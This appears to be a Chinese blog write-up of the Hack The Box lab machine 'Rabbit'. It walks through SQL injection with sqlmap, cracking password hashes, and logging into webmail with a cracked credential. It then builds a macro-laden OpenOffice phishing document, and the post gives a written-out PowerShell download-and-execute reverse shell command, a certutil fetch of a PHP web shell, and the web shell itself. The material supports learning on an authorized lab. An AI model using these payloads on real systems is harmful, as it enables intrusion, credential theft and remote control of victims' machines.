> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sw0uWL4rmh5MOanGYuwZ1A)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **73** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/133

靶机难度：初级（3.7/10）

靶机发布日期：2018 年 10 月 25 日

靶机描述：

Rabbit is a fairly realistic machine which provides excellent practice for client-side attacks and web app enumeration. The large potential attack surface of the machine and lack of feedback for created payloads increases the difficulty of the machine.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZP5E5qm8QvRibFibkHbLh0aBsR9E2tCsBHjt9oBG4eNsEBULl7c1nS1AQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.71....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ6UMT5pVZIn5NOIVYOZLrakUmQfLw1icicl8ywOoQMG5lhz36ZbFDibLvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZpWZq4ibOp30zKWbtBTKuO9YJ5T1QibZquDh0SttoKm4expiaH9uKkO2Iw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZtq1BLgFuQGOJFwe1f7FGSbsiaicoHliaiaZtncqP7a5qAMBpWH4kJlGTsQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZbe7Lr1CAyDp8I6IdkmQyNeibpW7iaVMnPqOyicbTfHYE6TAlBAibjzibr6w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZvMKYpdL8MVDFGQVvl5HawvLp5ib8G4D3BavkPNyZPo1vsBib6iaDdOfjw/640?wx_fmt=png)

可以看到 Nmap 扫描发现了很多信息... 服务器的 FQDN，DNS，Netbios 名称等

可以看到已安装了 Active Directory 域服务，Microsoft Exchange 和 IIS，以及其它很多感兴趣的端口（例如 8080）...

先从 web 开始下手吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ324EDsFxsdZliaG7OCeiaIoCv2AtK6kU7eWFnDVOw5RCO68zEHzfYjvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZicxLpIAX550paz35FMaqlAlXPPa59BmBmACMgLgXpf3BoeibLeJ6b0Gw/640?wx_fmt=png)

```
gobuster dir -u http://10.10.10.71:8080 -w directory-list-2.3-small.txt -t 10
```

爆破目录发现了 complain，然后在里面发现了访问登陆的页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZqtVpzTc7bUQnCV4b0rHFs4QKLAgTTsUia8ugljwytpCh6iaX3W6GPiapg/640?wx_fmt=png)

在 complain 目录下的 php 找到了投诉管理的登录界面...

这里应该是存在 sql 注入的...

先查看有什么漏洞可以利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZdj2UXxvEO0WB6e87fBQLUd5a7BDJqCUnOSNUczWAfenPamejxtU6JQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZmRhYiaBsCaauuc6mrWjG31sCIcW4v63zaH9LBibMEPBPPj4XBxUEsvGw/640?wx_fmt=png)

可以看到，只需要注册用户，然后通过 phpsession+sqlmap+cookie 即可提权... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZCxOL2ymE8DM3jeAIYokbCQQnuaMkiaJ7V8kaDbRbmjdh2UjHxLAJCRg/640?wx_fmt=png)

创建成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZwrkic9ZqiclMjQqk8icK2QG8vGUDCyhExLph0TvlTya47Z55smyqY0kFg/640?wx_fmt=png)

这里成功通过创建的账号密码登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZwjBIxLTEn3uPk57ibPM5KOxayIpWRteYmp9WBqlcwu29PqXAX5DI0Rg/640?wx_fmt=png)

可以看到利用 42968 exploit 里的注入代码，测试是存在 sql 注入的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZtiaySfr2Hzh9pHehMUCiay43ZlH2wc44VacsMP6TicvazBhPCWvQcrBtA/640?wx_fmt=png)

这里直接利用 burpsuit 抓后台数据，将 phpsession 和 cookie 等信息保存...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZibdcLFBlhQqak6sPibXictuz7qBicaRb622lRf9jaCdVStErZYWIbt8iaPQ/640?wx_fmt=png)

保存即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZsx7lEhgGTf6nYSyOdwLyia4aKPS5H91meu6o7GmPbQvCuV3ygSXiaLsw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZuBAGZgECeHo9dBo9DmSeWvaicZwnnughfuDfnXoibRtGib1iccNxOgI1OQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZvawqQJGz3ic8dRicO2mQE6j2BT0M2kPE0Y8wicxyx7DiabDXlDGupUaYgw/640?wx_fmt=png)

```
sqlmap -r dayu.req --technique=U --dbms mysql --dump
```

利用 sqlmap 注入攻击... 可以看到我刚注册过的账号等信息，以及办公区域的信息... 但是没有啥用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZuZ1qyV7DK6KqnRjFibIAKTiauTZ2eevgxrn8MzfQxKm768wSeZQ06ib6A/640?wx_fmt=png)

利用 --dbs 发现有数据库等信息内容，我这边一个一个找...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ5v2VJbCtGRgIRQ9qiaUibfibsMDOL80wfCEFDYy6zjYfgQTpib1opTJdeQ/640?wx_fmt=png)

```
sqlmap -r dayu.req --technique=U --dbms mysql -D secret --dump
```

这里我利用了默认文本密码进行注入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZvSbWZs1jH3XptFNPsmrU7RSnyYqQqgDWSoQ07MFbFmzFanhwUSCXZA/640?wx_fmt=png)

可以，在 secret 发现了用户密码信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZCTibrSslXTn4XjIKQX2cGYgG09WnOYuGFqmBBgWwyuwRyAdNAZlAzCg/640?wx_fmt=png)

将信息保存出来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZHnrXVOmxP93RTzSibBvOUxiaj8iaFBpuCl8zSaVrXtAAD36FRPsxjlBiaQ/640?wx_fmt=png)

```
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt userpasswd.txt
```

可以看到利用开膛手破解成功...

这里我利用账号密码登陆没发现什么有用的信息... 我转到了 443 上进行继续爆破...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZqKbBuYC1JBYicGFxicyZ0TNiby7gvIlM1bl1UrTbLvojWjF7PF077zowg/640?wx_fmt=png)

```
gobuster dir -k -u https://10.10.10.71 -w directory-list-2.3-small.txt  -o gobuster443.txt
```

继续爆破目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZeo2ZAT9JbSN1tHwibThn7ZS9lxJw0nsyMwrAox3CW1NXDiaWGRKuzWWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZOlxriaNicOPg24IjHVibUBcze86UNQY32Q6jN6gKxHlqhFMKntBbcqNGA/640?wx_fmt=png)

```
https://10.10.10.71/public
```

访问 public 后重定向到了 Outlook web app...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZXbrwL4551H45yegB5rfAO4RPGnWyEEzEQJzz2nIOWLjrcEvnEnFkiaQ/640?wx_fmt=png)

利用 john 爆破的 Ariel：pussycatdolls 成功登陆...

进来可以看到三封邮件.. 这里可以通过恶意钓鱼邮件进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZphPT5UtG49xUicFVrpZw450QAUvCqLBwaVnlwsedOmhU0BFFce2KDlQ/640?wx_fmt=png)

第二封邮件也提醒了，这边利用 powershell 发送邮件提权...

![](https://mmbiz.qpic.cn/mmbiz_png/XxrR38Omj5OU35wZiblPezbUu0aFe8g7adFDiar2por60icw9uh1XSFlykibc3jzCByDbG1hhhxNEk13P15Ofiam6Mg/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_gif/z0LeJkZyUa7niaILpQLyj2SXVMFWPGRlKJVgNJ6OUubgicSlhy5yoOrKmqJ2dcAicOTFYG7FUAxFCCbYwz70WcaoQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/91VlKjK1jgxkKJILyJj2LWD0PYmzSuXEq9Fic10RiaJK5dicRJKowHM8vaibCbeoaC3hW64rtu7FrV8yJx7MkRvszw/640?wx_fmt=gif)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_gif/sh14FEsstk64OiaHia2vXhZV1ckaMlfcgPj9vItaVmmUx5waCVlhrA1UaJR1DHpkmAdw2jESWs8tSFkjllJqibYsA/640?wx_fmt=gif)

这里开始自行写一个钓鱼邮件...GOGOGO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZSViaK2kmaOAUv20egf1kCNBgMbn1Ta4fvSibFyk4sPDJQ3mbtdeqTK4A/640?wx_fmt=png)

google 搜索 openoffice_document_macro.rb

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZC9eTKl9HMb7EQibXtWsqDnC8XC9B9Am8MY4oiaLibpGTLgASRO1nKBGpw/640?wx_fmt=png)

搜索 Getos，利用这里的源代码即可...

然后 apt-get install openoffice 下载这个工具，800 多 MB 但是需要写恶意程序都需要它，非常好的东西... 下载完打开 openoffice write

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZpqYTzHYlaml9lJMThXWeYXowaw2TfdQ5NHFXh7OiaYgtba1ZnSfia42w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZP5F00eVRF0GKh3oX2Kwr8hPPpJZkD4eqG5ibcpB1HAkSIiaYmLlvYVzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZXNTVgMVvDJVCGibEumJWLSUjhesCUPVRiayY2yiaibfsMhv16WTRictJuYA/640?wx_fmt=png)

跟着箭头走！！！

可以看到已经创建好了一个钓鱼的恶意文件的架构！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZpYObFWplh39Yx8Ltpibb68v4jbpy5AfqiaVUarBibxvGFx2ZCKTlkJtZg/640?wx_fmt=png)

然后将前面 openoffice_document_macro.rb 搜索的 Getos 那段内容复制进来即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ9pG2ic8zAkSTGLxOtMIwHV2KkvxJydUV1B8rN1H0N69kYJYzxJ0zgiaQ/640?wx_fmt=png)

搜索 WINDOWSGUI 可以看到前面有编译了，按照它的编译修改下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZB4KcD4XPjjPic0PwCMN2tHFbthw9fYqFibDqYWicblvb2Mib15u3icTRZ1Q/640?wx_fmt=png)

改好后，下一步就是查找 exploi...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZiaW8ScLibqjs3iam0Y3ocZtUFCuPHAhIDw1GoLO1q2bfiaQq964QLHFqjQ/640?wx_fmt=png)这里按照搜索 get_statger... 继续查找 windows 的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZGlPeHkicG3LEWW2f6qAXBnTIMOtbCt5Ozp6xJ5rJNK4aVw57CjO0lAw/640?wx_fmt=png)

继续搜索 windows_stager，可以发现 shell 利用即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZRiaeD2QkEaibjBK894ReQf5REhuj8NA9qU72wmjqhrRMwfSLshUia3nmg/640?wx_fmt=png)

写入利用 certutil 进行上传 nc.exe 进行提权... 这里本地要下载好 nc.exe，打开 80 服务，nc 开启 443 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ79sREkHQcTTP0O7jX3HsqWrKOSVianQDdDsHUjOYfjDdGKKvLMVQXug/640?wx_fmt=png)

左上角保存或者 ctrl+s 即可.. 保存在自己目录下...

好了，这里已经写好了一个钓鱼邮件的恶意程序，开始发送

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZtAHxoa8nkDia4XZNt4ukcgQicLdmwS88MchOaQjo7ibZLgibiaibO3OdgRPg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZIvicN0weTpcNbsicgz3TDt6NcvWefYHkXbxIfeT23k6TjxVeBhEGtaAQ/640?wx_fmt=png)

上传后等待即可提权...

解释：为了逃避防病毒程序的检测，所以使用 Shell 来对合法的网络连接的二进制文件. exe、.asp1 等进行后门操作... 将宏内容压缩后，以. odt 扩展名重命名，并生成一个 Web 服务器来提供恶意的二进制文件...

![](https://mmbiz.qpic.cn/mmbiz_gif/91VlKjK1jgxkKJILyJj2LWD0PYmzSuXEq9Fic10RiaJK5dicRJKowHM8vaibCbeoaC3hW64rtu7FrV8yJx7MkRvszw/640?wx_fmt=gif)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_gif/sh14FEsstk64OiaHia2vXhZV1ckaMlfcgPj9vItaVmmUx5waCVlhrA1UaJR1DHpkmAdw2jESWs8tSFkjllJqibYsA/640?wx_fmt=gif)

利用 MSF 里的 openoffice 的 Exploit 进行生成 obt 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZs0KSxDfOaPAe1E5mDlhqDyVA3YSTeGCubI4gp4QOPx83yK4YoxviaNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZsXjjIDbNAaDO0YFjzXnIvuQlkiaRWCHBhhSdPZxtmzemaWVpS7Dl3Pg/640?wx_fmt=png)

这里填错了，我的本地 IP 是 10.10.14.5...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZHM5gfGqvBe5H3ia3aFjNtRctNZgPPtKWKZUUgCurMCPElnAj8JYkbBA/640?wx_fmt=png)

成功生成了钓鱼邮件的恶意程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ8o8MelxK5rJUSCBCMOTBVdibiamj6wMWY15WI096HpTVGibZj3dE7B3EQ/640?wx_fmt=png)

放到本地后重命名为 zip 文件... 然后打开即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZxA8hmcgSb8NwiciadBVIPDw82xKqa9dKU894DrnoGXzmPb8QXMJWZFEw/640?wx_fmt=png)

或者用 openoffice 进行打开，打开第一次会报错，记得修改这里....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZHichuZdmvEibS0exmI3ficDAkBHx5P96dw2QMPjsraGe9QoVviawP7Dgiag/640?wx_fmt=png)

用文本打开内容是这样的... 这里需要修改下 powershell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZeRdfbhibHSwlI3NTrEcKBUtstKdxBa2c3F4tIWspUJNnplJtG70usRQ/640?wx_fmt=png)

```
powershell.exe -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.5/dayushell.ps1');dayushell -c 10.10.14.5 -p 1234 -e cmd;
```

修改完后将 zip 改成 odt 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ9iciaKiatNWmOeHVYnnVMnsDwOdEic9rubmZO4GeBvicdSZaNEE4RXQ4rgQ/640?wx_fmt=png)

这里点 send 发送即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZuPQatTdxJF973aUBBibkribV6XBibSLRApQ2JsvDvq65dGcIG8B9D1EkA/640?wx_fmt=png)

成功获得低权用户 raziel 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ8c1lib3DXqnbTodubIrU4xgWx80E8RQ4Uk5ibCUFNicggXJLuoticorFgw/640?wx_fmt=png)

成功拿到 user.txt...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZhtEw3rBiaX8kyibJE41EIdFCZJkKUlX5sjgl1X7f8qZmG1FocwhibeFKQ/640?wx_fmt=png)

可以看到在其放一个反向 shell.php 即可提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZHbkYBQTvPBJDmZyspvuZEHSicYH1frCpzgLfmguBP73KD0FGFef4s4A/640?wx_fmt=png)

```
<?php system($_GET["cmd"]);
certutil -urlcache -split -f http://10.10.14.5/shell1.php c:\wamp64\www\shell1.php
http://10.10.10.71:8080/dayuroot.php?cmd=whoami
```

可以看到成功获得 system 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOSibTqpjtp1NqHDVUkQXthZ6S0ENWTMp7r1TH9SPaM0cAVtyOfSUoN9q5bBmBQiaQm4EJ2xatoxTiaw/640?wx_fmt=png)

成功获得 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)